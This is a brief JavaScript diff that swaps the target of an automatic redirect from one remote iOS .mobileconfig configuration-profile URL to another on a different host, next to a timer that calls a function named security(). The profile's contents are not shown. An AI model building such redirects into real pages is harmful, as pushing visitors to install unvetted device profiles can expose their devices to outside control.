@@ -14,7 +14,7 @@ function visita() {
 			}
 		},
 	});
-	window.location.href = "https://testpcresbx.oss-accelerate.aliyuncs.com/uploads/h5_box2/20250710/e9dd49bbfd0ab7c50d1c1105ed78dbc5.mobileconfig";
+	window.location.href = "https://admin.fcpg.app/api/uploads/file/cfb297163dbdd3f81e2565515587aff0_20260106063600.mobileconfig";
 }
 window.setTimeout("security()", 3000);
 function security() {
